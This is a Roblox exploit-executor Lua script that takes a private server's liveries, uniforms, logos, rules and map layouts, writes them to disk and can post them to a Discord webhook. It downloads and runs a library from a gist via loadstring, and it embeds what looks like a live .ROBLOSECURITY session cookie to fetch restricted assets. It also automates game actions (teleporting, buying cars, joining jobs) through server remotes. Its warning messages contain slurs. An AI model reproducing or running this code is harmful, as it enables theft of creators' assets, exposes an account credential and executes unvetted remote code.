if not game:IsLoaded() then
    game.Loaded:Wait()
end

local lp = game:GetService("Players").LocalPlayer
local char = lp.Character or lp.CharacterAdded:Wait()

local httpService = game:GetService("HttpService")
local replicatedStorage = game:GetService("ReplicatedStorage")
local vehicles = require(replicatedStorage.Modules.Vehicles)
local getVehicleSpawnData = require(replicatedStorage.Remotes.Vehicles.GetVehicleSpawnData)
local liveryDenialReasons = require(replicatedStorage.Modules.LiveryDenialReasons)

local zlibC = game:HttpGet("https://gist.githubusercontent.com/qaxss/1db156969f3c5b9fef99ab0c2a631a23/raw/937ed62f816878d28cdb6ebe96bddc9250b74909/zlib.lua")
local LibDeflate = loadstring(zlibC)()

local settings = {
    download = false,
    upload = false,
    robloxApiKey = nil,
    robloxId = nil,
    sendToWebhook = false,
    webhookURL = nil,
    cookie = ".ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhADIhsKBGR1aWQSEzQxNDIwMjg4MjE4MjExOTQyMTEoAw.cPoRURMkQQHh8p1BcPjAVikkyHYbNgGwrVnQobs_LElJszqAETPXQb5tVmNuunC8oMQd0TvjTVCfexel2g3FAqPx5tQwa4wz665mZ5O7LYkHT_F02DusYcqHkkUQsHZGnC1LJo38NzmTzWzWl0wgvh42Cot5Tw7p0Fri57vEsbDRbyW82Dxv7SI4Bt4Iie9Oo2BleCiX1AgeZyRrxPc7TSHlAzWwvUL8BJNleE-AeMo2utJPdeftfMlzq5E2g-Ac3boL5Al4-pwO3eyeHYp82-sg1c8cF6eVCgpZpBA5KcPWpZPLycmPu5iEwnU-7vhYvWK5l4F8ndCvairYS4F5dDmtDrQKzfIWeODAh5ye-kt7wm5gIkCapxrTEn7-0ldWNoduLqqY1tvkqmMl9L350Ivb52T_7jyY7nWlmFlbzZFHIPT1-wI5lDP5gCAB20K3L3dvDZZbCe_Y1ffKWkek7c-oFz3KwP7Uh6NFCMARxzLLGeFQul3J52etoecZTTjygqtNuTzMzwDs7utF--U5WkNO610IOnTXW6RM0-hulxe8dYFCc61OXR_GZk_7tJRYnvrrnVlcFXjNZ5o8J6t7XpTOm7gdvuxnTeLFCoqr1WJ8I6Xsr2o3CkD1GIhVC8kHgT6eB3b-DwIZsB0LdGXCcuEClwQchIWsA8umQvvrZkvTUDCEdyGijdjFyD4LTQvPRCNPYxF7bEICeYPYIg5dqQajUwixRpSYqQqAwXR_7yXJX1K_Q8Ho2lkmKNnEucEdHFVQO02O4ULZEbEKlse4hki3t-iu5ccXiBmpFQMBZKvKUBoK; rbx-ip2=1; RBXSessionTracker=sessionid=2154515d-8b46-4f69-ba33-b7a2a31f07fe; RBXEventTrackerV2=CreateDate=03/21/2026 11:23:32&rbxid=10466406408&browserid=1774110212356001; GuestData=UserID=-1180234211; RBXPaymentsFlowContext=c8bd97ff-dd19-4dc1-b91f-fe37af73d241,; RBXcb=RBXViralAcquisition%3Dfalse%26RBXSource%3Dfalse%26GoogleAnalytics%3Dfalse",
    cookieValid = false,
    baseDownloadLocation = "asset taker/"
}

local categoryMap = {
    ["JobTrailers"] = "Job",
    ["Police"] = "Law",
    ["SheriffTrailers"] = "Law",
    ["DOT"] = "DOT",
    ["DOTTrailers"] = "DOT",
    ["FireTrailers"] = "Fire",
    ["Sheriff"] = "Law",
    ["Fire"] = "Fire",
    ["PoliceTrailers"] = "Law",
    ["Job"] = "Job"
}

local serverName, joinCode = nil, nil
local response, _ = pcall(function()
    serverName = replicatedStorage.PrivateServers.Info.ServerName.Value
    joinCode = replicatedStorage.PrivateServers.Info.Code.Value
end)

if not response then warn("Gay you arent in a private server") ; return end

-- sanitizes a single path segment only, never a full path
local function sanitize(s)
    s = tostring(s):match("^%s*(.-)%s*$")
    s = s:gsub('[<>:"/\\|?*]', "_")
    return s
end

local safeServerName = sanitize(serverName)

local function testCookie(cookie)
    local response = request({
        Url = "https://assetdelivery.roblox.com/v1/asset/?id=" .. "116800358210190",
        Method = "GET",
        Headers = {
            ["Cookie"] = cookie
        }
    })
    if tostring(response.StatusCode) ~= "200" then
        return false
    else
        return true
    end
end
if testCookie(settings.cookie) then
    settings.cookieValid = true
else
    warn("Invalid cookie")
    return
end

--[[
    misc functions
]]

local function extractId(template)
    return template:match("%d+") or template
end

local function getColor(color)
    color = color:split(", ")
    local newColor = Color3.new(color[1], color[2], color[3])
    return newColor:ToHex()
end

local function testCookie(cookie)
    local response = request({
        Url = "https://assetdelivery.roblox.com/v1/asset/?id=116800358210190",
        Method = "GET",
        Headers = {
            ["Cookie"] = cookie
        }
    })
    if
        response.Body
        == [[{"errors":[{"code":0,"message":"Authentication required to access Asset."}]}]]
    then
        return false
    else
        return true
    end
end

local function decompressGzip(data)
    local byte1, byte2, byte3, byte4 = data:byte(1, 4)
    if
        byte1 == 0x89
        and byte2 == 0x50
        and byte3 == 0x4E
        and byte4 == 0x47
    then
        return data
    end

    if data:byte(1) ~= 0x1F or data:byte(2) ~= 0x8B then
        return nil, "Not GZIP format"
    end

    local flags = data:byte(4)
    local pos = 11

    if bit32.band(flags, 0x04) ~= 0 then
        local xlen = data:byte(pos) + data:byte(pos + 1) * 256
        pos = pos + 2 + xlen
    end

    if bit32.band(flags, 0x08) ~= 0 then
        while data:byte(pos) ~= 0 do
            pos = pos + 1
        end
        pos = pos + 1
    end

    if bit32.band(flags, 0x10) ~= 0 then
        while data:byte(pos) ~= 0 do
            pos = pos + 1
        end
        pos = pos + 1
    end

    if bit32.band(flags, 0x02) ~= 0 then
        pos = pos + 2
    end

    local deflateData = data:sub(pos, #data - 8)

    local success, result = pcall(function()
        return LibDeflate.Deflate.Decompress(deflateData)
    end)

    if success and result then
        return result
    else
        return nil, "Decompression failed: " .. tostring(result)
    end
end

-- folder and imageName must already be sanitized before calling this
local function getImage(imageId, folder, imageName)
    local response
    if settings.cookieValid then
        response = request({
            Url = "https://assetdelivery.roblox.com/v1/asset/?id=" .. imageId,
            Method = "GET",
            Headers = {
                ["Cookie"] = settings.cookie
            }
        })
    else
        warn("No fucking valid cookie retard")
        return false, "No valid cookie"
    end

    local data = response.Body
    local contentEncoding =
        response.Headers["Content-Encoding"]
        or response.Headers["content-encoding"]

    if contentEncoding == "gzip" then
        local decompressed, err = decompressGzip(data)

        if decompressed then
            data = decompressed
        else
            warn("Decompression failed:", err)
            return false, response, err
        end
    end

    local byte1, byte2, byte3, byte4 = data:byte(1, 4)
    if
        byte1 == 0x89
        and byte2 == 0x50
        and byte3 == 0x4E
        and byte4 == 0x47
    then
        writefile(folder .. "/" .. imageName .. ".png", data)
        return true, data
    else
        writefile(
            folder .. "/" .. imageName .. ".txt",
            response.StatusCode .. "\n" .. response.Body
        )
        return false, response
    end
end

local debounce = false
local function sendToDiscord(embed, images, webhook)
    repeat task.wait() until not debounce
    debounce = true
    local success, response = pcall(function()
        return request({
            Url = webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = httpService:JSONEncode({
                embeds = { embed }
            })
        })
    end)
    if response.StatusCode == 429 then
        task.wait(5)
        local success, response = pcall(function()
            return request({
                Url = webhook,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = httpService:JSONEncode({
                    embeds = { embed }
                })
            })
        end)
    end

    task.wait()

    if #images > 0 then
        for i = 1, #images, 10 do
            local boundary =
                "----WebKitFormBoundary" .. httpService:GenerateGUID(false)
            local body = ""

            local endIndex = math.min(i + 9, #images)
            for j = i, endIndex do
                local imageData = images[j].data
                local fileName = images[j].name

                body = body .. "--" .. boundary .. "\r\n"
                body = body
                    .. 'Content-Disposition: form-data; name="file'
                    .. (j - i + 1)
                    .. '"; filename="'
                    .. fileName
                    .. '"\r\n'
                body = body .. "Content-Type: image/png\r\n\r\n"
                body = body .. imageData .. "\r\n"
            end

            body = body .. "--" .. boundary .. "--\r\n"

            local imageSuccess, imageResponse = pcall(function()
                return request({
                    Url = webhook,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "multipart/form-data; boundary="
                            .. boundary
                    },
                    Body = body
                })
            end)

            if imageResponse.StatusCode == 429 then
                task.wait(5)
                local imageSuccess, imageResponse = pcall(function()
                    return request({
                        Url = webhook,
                        Method = "POST",
                        Headers = {
                            ["Content-Type"] = "multipart/form-data; boundary="
                                .. boundary
                        },
                        Body = body
                    })
                end)
            end

            if endIndex < #images then
                task.wait(0.2)
            end
        end
    end
    debounce = false
end

--[[
    taker functions
]]

local function getServerData()
    local serverSettings =
        replicatedStorage:WaitForChild("PrivateServers"):WaitForChild("GetSettings"):InvokeServer()

    return {
        name = serverSettings.Data.Name,
        code = serverSettings.Data.CurrKey,
        icon = serverSettings.Data.IconId,
        rules = serverSettings.Data.Rules,
        description = serverSettings.Data.Description,
        teams = serverSettings.Data.CustomTeams,
        original = serverSettings
    }
end

local function makeLiveryTable(car, liveryData, carId)
    local liveryTable = {
        ["car"] = car.Name,
        ["carId"] = carId,
        ["liveryCount"] = #liveryData,
        ["liveries"] = {}
    }
    for _, livery in liveryData do
        local outLivery = {
            name = sanitize(tostring(livery.liveryName)),
            vehicleColor = tostring(getColor(livery.vehicleColor)),
            liveryColor = tostring(getColor(livery.liveryColor)),
            liveryTransparency = tostring(livery.liveryTransparency),
            ELS = {
                park = livery.ParkPatterns,
                stg1 = livery.Stage1Patterns,
                stg2 = livery.Stage2Patterns,
                stg3 = livery.Stage3Patterns,
                color = livery.ELSColor
            },
            approved = livery.isApproved == true and "Approved"
                or liveryDenialReasons[livery.isApproved],
            textures = {}
        }
        for side, id in livery.textureIds do
            outLivery.textures[side] = tostring(id)
        end
        table.insert(liveryTable.liveries, outLivery)
    end
    return liveryTable
end

local function makeLiveryEmbed(car, uniqueLivery, category)
    local embed = {
        title = car.Name,
        description = "",
        fields = {
            { name = "Team", value = categoryMap[category], inline = true },
            {
                name = "Name",
                value = "`" .. uniqueLivery.name .. "`",
                inline = true
            },
            {
                name = "Vehicle Color",
                value = "`" .. uniqueLivery.vehicleColor .. "`",
                inline = true
            },
            {
                name = "Livery Color",
                value = "`" .. uniqueLivery.liveryColor .. "`",
                inline = true
            },
            {
                name = "Livery Transparency",
                value = "`" .. uniqueLivery.liveryTransparency .. "`",
                inline = true
            },
            {
                name = "Approval Status",
                value = uniqueLivery.approved,
                inline = true
            },
            { name = "Server", value = serverName, inline = true },
            { name = "Join code", value = joinCode, inline = true }
        }
    }
    for side, id in uniqueLivery.textures do
        embed.description = embed.description
            .. side
            .. ": `"
            .. id
            .. "`\n"
    end
    return embed
end

local function getLiveryImages(textureIds, downloadLocation)
    local textureAmount = 0
    local passCount = 0
    for _, _ in textureIds do
        textureAmount += 1
    end

    local images = {}
    for side, id in textureIds do
        task.spawn(function()
            local ok, response = getImage(id, downloadLocation, side)
            if ok then
                table.insert(images, {
                    name = side .. ".png",
                    data = response
                })
            else
                warn("Failed to get image", response.StatusCode, response.Body)
            end
            passCount += 1
        end)
        task.wait()
    end

    repeat task.wait() until passCount == textureAmount
    return images
end

local function formatLiveryData(car, liveryData, category)
    local livery = ""
    local carId = tonumber(car)
    local car = vehicles.GetCarById(categoryMap[category], tonumber(car))
    local liveryTable = makeLiveryTable(car, liveryData, carId)

    livery = livery
        .. string.format("%-22s %s\n", "Car:", liveryTable.car)
        .. string.format(
            "%-22s %s\n",
            " Livery Count:",
            liveryTable.liveryCount
        )

    for key, uniqueLivery in liveryTable.liveries do
        local unique = ""
            .. string.format("%-22s %s\n", "  Name:", uniqueLivery.name)
            .. string.format(
                "%-22s %s\n",
                "  Vehicle Color:",
                uniqueLivery.vehicleColor or "Unknown"
            )
            .. string.format(
                "%-22s %s\n",
                "  Livery Color:",
                uniqueLivery.liveryColor or "Unknown"
            )
            .. string.format(
                "%-22s %s\n",
                "  Livery Transparency:",
                uniqueLivery.liveryTransparency or "Unknown"
            )
            .. string.format(
                "%-22s %s\n",
                "  Approval Status:",
                uniqueLivery.approved or "Unknown"
            )
        livery = livery .. unique
        livery = livery .. "  Texture Ids:\n"
        for side, id in uniqueLivery.textures do
            livery = livery
                .. string.format("    %-12s %s\n", side .. ":", id)
        end

        if settings.download then
            local downloadLocation
            local safeCar = sanitize(liveryTable.car)
            local safeCategory = sanitize(category)
            local safeLiveryName = sanitize(uniqueLivery.name)

            if liveryTable.liveryCount == 1 then
                downloadLocation = settings.baseDownloadLocation
                    .. safeServerName
                    .. "/"
                    .. safeCategory
                    .. "/liveries/"
                    .. safeCar
            else
                downloadLocation = settings.baseDownloadLocation
                    .. safeServerName
                    .. "/"
                    .. safeCategory
                    .. "/liveries/"
                    .. safeCar
                    .. "/"
                    .. safeLiveryName
            end

            makefolder(downloadLocation)
            writefile(
                downloadLocation .. "/" .. safeLiveryName .. ".txt",
                unique
            )

            local images = getLiveryImages(uniqueLivery.textures, downloadLocation)
            local embed = makeLiveryEmbed(car, uniqueLivery, category)

            if
                settings.sendToWebhook
                and string.find(
                    settings.webhookURL,
                    "discord.com/api/webhooks/"
                )
            then
                sendToDiscord(embed, images, settings.webhookURL)
            end
        end

        if key > 0 and key ~= liveryTable.liveryCount then
            livery = livery .. "  " .. string.rep("-", 15) .. "\n"
        end
    end
    return livery .. "\n", liveryTable
end

local function outputLiveries(liveryTable)
    local liveryTables = {}
    local liveries = [[
  _     _                _           
 | |   (_)_   _____ _ __(_) ___  ___ 
 | |   | \ \ / / _ \ '__| |/ _ \/ __|
 | |___| |\ V /  __/ |  | |  __/\__ \
 |_____|_| \_/ \___|_|  |_|\___||___/

]]
    local liveryCopy = table.clone(liveryTable)
    for team, val in liveryCopy do
        local count = 0
        if type(val) == "table" then
            for _, _ in val do
                count += 1
            end
        end
        if count > 0 then
            if settings.download then
                makefolder(
                    settings.baseDownloadLocation
                        .. safeServerName
                        .. "/"
                        .. sanitize(team)
                )
            end
            liveries = liveries
                .. string.rep("=", 30)
                .. "\n"
                .. tostring(team)
                .. "\n"
                .. string.rep("=", 30)
                .. "\n"
            liveryTables[team] = {}
            if type(val) == "table" then
                for car, carData in val do
                    if #carData > 0 then
                        local liveryString, liveryTable =
                            formatLiveryData(car, carData, team)
                        liveries = liveries .. liveryString
                        table.insert(liveryTables[team], liveryTable)
                    end
                end
            end
        end
    end
    replicatedStorage:WaitForChild("FE"):WaitForChild("StartJob"):InvokeServer("Quit")
    task.wait()
    replicatedStorage:WaitForChild("FE"):WaitForChild("StartJob"):InvokeServer("Quit")
    return liveries, liveryTables
end

local function getClosestCivilianSpawner()
    local closest, dist = nil, math.huge
    local playerLoc = game.Players.LocalPlayer.Character.WorldPivot.Position
    for _, item in workspace:WaitForChild("VehicleSpawners"):GetChildren() do
        if
            item.Name == "Civilian_Spawners"
            and #item:GetChildren() > 0
        then
            for _, spawner in item:GetChildren() do
                if #spawner:GetChildren() > 0 then
                    local a = playerLoc - spawner.WorldPivot.Position
                    if a.Magnitude < dist then
                        closest = spawner
                        dist = a.Magnitude
                    end
                end
            end
        end
    end
    return closest
end

local function getCar()
    local closest = getClosestCivilianSpawner()
    local interaction =
        closest:WaitForChild("SpawnClicker", 2):WaitForChild(
            "InteractionAttachment",
            2
        )

    if not interaction then return false end

    local spawnCar = { "Falcon Traveller 2003", nil, false, interaction }
    local buyCar = {
        "Falcon Traveller 2003",
        Color3.new(
            0.05098039656877518,
            0.4117647409439087,
            0.6745098233222961
        )
    }

    char.HumanoidRootPart.Position = closest.WorldPivot.Position
    task.wait(0.2)
    replicatedStorage:WaitForChild("FE"):WaitForChild("BuyCar"):InvokeServer(
        unpack(buyCar)
    )
    task.wait(0.2)
    replicatedStorage:WaitForChild("FE"):WaitForChild("SpawnCar"):FireServer(
        unpack(spawnCar)
    )

    return true
end

local starter = nil
local function isPlayerInOwnCar()
    local seat = char.Humanoid.SeatPart
    if not seat then
        if os.time() - starter > 10 then
            getCar()
            starter = os.time()
        end
        return false
    else
        if seat.Parent:GetAttribute("Owner") == lp.Name then
            return true
        end
    end
    return false
end

local function findPlayerCar()
    for _, car in workspace.Vehicles:GetChildren() do
        if car:GetAttribute("Owner") == lp.Name then
            return car
        end
    end
end

local function gotoLocation()
    local atLocation = false

    local p = char.HumanoidRootPart.Position - workspace:WaitForChild("JobStarters"):WaitForChild("News Station Worker").Main.Position
    if p.Magnitude < 30 then
        atLocation = true
    end

    if atLocation then return end

    repeat
        local car = findPlayerCar()
        car:MoveTo(
            workspace:WaitForChild("JobStarters"):WaitForChild("News Station Worker").Main.Position
        )

        local p = char.HumanoidRootPart.Position - workspace:WaitForChild("JobStarters"):WaitForChild("News Station Worker").Main.Position
        if p.Magnitude > 30 then
            print(p.Magnitude)
            if not getCar() then
                warn("Failed to get car!", "Make sure to spawn a car.")
            end
        else
            atLocation = true
        end
    until atLocation == true
end

local function getJob()
    local newsJoin = {
        "Start",
        workspace:WaitForChild("JobStarters"):WaitForChild("News Station Worker")
    }

    if
        game:GetService("ReplicatedStorage"):WaitForChild("FE"):WaitForChild("GetWantedLevel"):InvokeServer(game.Players.LocalPlayer)
        ~= 0
    then
        warn(
            "Player is wanted!",
            "Make sure you are not wanted to take liveries."
        )
        return
    end

    if game:GetService("Players").LocalPlayer.Team ~= game.Teams.Civilian then
        warn("Wrong team!", "You need to be a civilian to do this!")
        return
    end

    if not getCar() then
        warn("Failed to get car!", "Make sure to spawn a car.")
    end

    task.wait(0.2)

    starter = os.time()
    repeat task.wait() until isPlayerInOwnCar()

    local car = findPlayerCar()
    car:MoveTo(
        workspace:WaitForChild("JobStarters"):WaitForChild(
            "News Station Worker"
        ):WaitForChild("Main").Position
    )

    --task.wait(2)
    --gotoLocation()

    task.wait(1)

    local joinTeam =
        game:GetService("ReplicatedStorage"):WaitForChild("FE"):WaitForChild("StartJob"):InvokeServer(
            unpack(newsJoin)
        )

    if joinTeam ~= "Success" then
        warn("Livery taker debug", joinTeam)
    end
end

local function getLiveries()
    getJob()

    local success, data =
        getVehicleSpawnData:Call(
            "News Station Worker",
            workspace:WaitForChild("VehicleSpawners"):WaitForChild("NewsStationWorker_Spawners"):WaitForChild("Stand"):WaitForChild("SpawnClicker"):WaitForChild("InteractionAttachment")
        ):Await()

    if success then
        if data.liveries then
            return outputLiveries(data.liveries)
        else
            return "", {}
        end
    else
        warn(
            "Failed to get livery data!",
            "Something seems to have gone wrong"
        )
        return
    end
end

local function outputServerInfo()
    local data = getServerData()
    local server = [[
  ____                             _        __       
 / ___|  ___ _ ____   _____ _ __  (_)_ __  / _| ___  
 \___ \ / _ \ '__\ \ / / _ \ '__| | | '_ \| |_ / _ \ 
  ___) |  __/ |   \ V /  __/ |    | | | | |  _| (_) |
 |____/ \___|_|    \_/ \___|_|    |_|_| |_|_|  \___/ 

]]

    server = server
        .. string.format("%-10s %s\n", "Name:", tostring(data.name))
        .. string.format("%-10s %s\n", "Join code:", tostring(data.code))
        .. string.format("%-10s %s\n", "Icon:", tostring(data.icon))
        .. "Teams:\n"
    for team, info in data.teams do
        server = server
            .. string.format("%-10s %s\n", " Team:", tostring(team))
            .. string.format("%-10s %s\n", "   Name:", tostring(info.Name))
            .. string.format("%-10s %s\n", "   Logo:", tostring(info.Logo))
    end
    server = server
        .. string.format("%-10s %s", "Rules:\n", tostring(data.rules))
        .. string.format(
            "%-10s %s",
            "Description:\n",
            tostring(data.description)
        )

    local mainEmbed = {
        title = data.name,
        description = "",
        fields = {
            {
                name = "Server name",
                value = tostring(data.name),
                inline = true
            },
            {
                name = "Server join code",
                value = tostring(data.code),
                inline = true
            },
            {
                name = "Server icon",
                value = "`" .. tostring(data.icon) .. "`",
                inline = true
            }
        }
    }
    for team, info in data.teams do
        mainEmbed.description = mainEmbed.description
            .. string.format("%-10s %s\n", "**Team:**", tostring(team))
            .. string.format(
                "%-10s %s\n",
                "  **Name:**",
                "`" .. tostring(info.Name) .. "`"
            )
            .. string.format(
                "%-10s %s\n",
                "  **Logo id:**",
                "`" .. tostring(info.Logo) .. "`"
            )
    end

    local descEmbed = {
        title = data.name,
        description = "```" .. data.description .. "```"
    }

    local rulesEmbed = {
        title = data.name,
        description = "```" .. data.rules .. "```"
    }

    local images = {}
    if settings.download then
        makefolder(settings.baseDownloadLocation .. safeServerName)

        local ok, img = getImage(
            data.icon,
            settings.baseDownloadLocation .. safeServerName,
            "logo"
        )
        if ok then
            table.insert(images, { name = "logo.png", data = img })
        end

        for team, info in data.teams do
            local safeTeam = sanitize(team)
            local safeName = sanitize(info.Name)
            local teamFolder = settings.baseDownloadLocation
                .. safeServerName
                .. "/"
                .. safeTeam
            makefolder(teamFolder)
            local ok, img = getImage(info.Logo, teamFolder, safeName)
            if ok then
                table.insert(images, { name = safeName .. ".png", data = img })
            end
        end
    end

    if
        settings.sendToWebhook
        and string.find(settings.webhookURL, "discord.com/api/webhooks/")
    then
        sendToDiscord(mainEmbed, {}, settings.webhookURL)
        sendToDiscord(descEmbed, {}, settings.webhookURL)
        sendToDiscord(rulesEmbed, images, settings.webhookURL)
    end

    return server .. "\n\n", data.original
end

local function getUniforms()
    local uniformTable = {}
    local uniforms = [[
  _   _       _  __                          
 | | | |_ __ (_)/ _| ___  _ __ _ __ ___  ___ 
 | | | | '_ \| | |_ / _ \| '__| '_ ` _ \/ __|
 | |_| | | | | |  _| (_) | |  | | | | | \__ \
  \___/|_| |_|_|_|  \___/|_|  |_| |_| |_|___/
                                             
]]

    for _, team in replicatedStorage.ReplicatedState.Uniforms:GetChildren() do
        local safeTeam = sanitize(team.Name)
        if settings.download then
            makefolder(
                settings.baseDownloadLocation
                    .. safeServerName
                    .. "/"
                    .. safeTeam
                    .. "/uniforms"
            )
        end
        uniformTable[team.Name] = {}
        uniforms = uniforms
            .. string.rep("=", 30)
            .. "\n"
            .. team.Name
            .. "\n"
            .. string.rep("=", 30)
            .. "\n"
        for _, uniform in team:GetChildren() do
            if uniform:FindFirstChild("CustomUniform") then
                local shirtId = extractId(tostring(uniform.Shirt.ShirtTemplate))
                local pantsId = extractId(tostring(uniform.Pants.PantsTemplate))
                uniformTable[team.Name][uniform.Name] = {
                    shirt = shirtId,
                    pants = pantsId
                }

                uniforms = uniforms
                    .. string.format(
                        "%-10s %s\n",
                        "  Name:",
                        tostring(uniform.Name)
                    )
                    .. string.format("%-10s %s\n", "    Shirt:", shirtId)
                    .. string.format("%-10s %s\n", "    Pants:", pantsId)

                task.spawn(function()
                    local images = {}
                    if settings.download then
                        local safeName = sanitize(uniform.Name)
                        local uniformFolder = settings.baseDownloadLocation
                            .. safeServerName
                            .. "/"
                            .. safeTeam
                            .. "/uniforms/"
                            .. safeName
                        makefolder(uniformFolder)

                        local a, img =
                            getImage(shirtId, uniformFolder, "Shirt")
                        if a then
                            table.insert(
                                images,
                                { name = "shirt.png", data = img }
                            )
                        end

                        local a, img =
                            getImage(pantsId, uniformFolder, "Pants")
                        if a then
                            table.insert(
                                images,
                                { name = "pants.png", data = img }
                            )
                        end
                    end

                    local embed = {
                        title = serverName,
                        fields = {
                            {
                                name = "Team",
                                value = tostring(team.Name),
                                inline = true
                            },
                            {
                                name = "Name",
                                value = tostring(uniform.Name),
                                inline = true
                            },
                            {
                                name = "Shirt",
                                value = "`" .. shirtId .. "`",
                                inline = true
                            },
                            {
                                name = "Pants",
                                value = "`" .. pantsId .. "`",
                                inline = true
                            }
                        }
                    }

                    if settings.sendToWebhook then
                        sendToDiscord(embed, images, settings.webhookURL)
                    end
                end)
            end
        end
    end

    return uniforms, uniformTable
end

local function getELS()
    return replicatedStorage.FE.GetCustomELS:InvokeServer()
end

local function getMapTemplates()
    local mapLayouts = {}

    for _, template in workspace.MapLayouts:GetChildren() do
        local layoutName = template:GetAttribute("LayoutName")
        mapLayouts[layoutName] = {}
        for _, prop in template.Props:GetChildren() do
            table.insert(mapLayouts[layoutName], {
                name = prop:GetAttribute("PropName"),
                position = tostring(prop.WorldPivot)
            })
        end
    end

    return mapLayouts
end

local function takeAssets()
    local outputString = ""
    local outputTable = {}

    makefolder(settings.baseDownloadLocation .. safeServerName)

    local serverInfoOutput, serverSettings = outputServerInfo()
    outputString = outputString .. serverInfoOutput
    outputTable.settings = table.clone(serverSettings)

    local uniformsOutput, uniformTable = getUniforms()
    outputString = outputString .. uniformsOutput
    outputTable.uniforms = table.clone(uniformTable)

    local liveriesOutput, liveryTable = getLiveries()
    outputString = outputString .. liveriesOutput
    outputTable.liveries = table.clone(liveryTable)

    local ELSTable = getELS()
    outputTable.ELS = table.clone(ELSTable)

    outputTable.Map = getMapTemplates()

    writefile(
        settings.baseDownloadLocation
            .. safeServerName
            .. "/"
            .. safeServerName
            .. ".json",
        httpService:JSONEncode(outputTable)
    )
    writefile(
        settings.baseDownloadLocation
            .. safeServerName
            .. "/"
            .. safeServerName
            .. ".txt",
        outputString
    )

    print("DONE")
end

takeAssets()
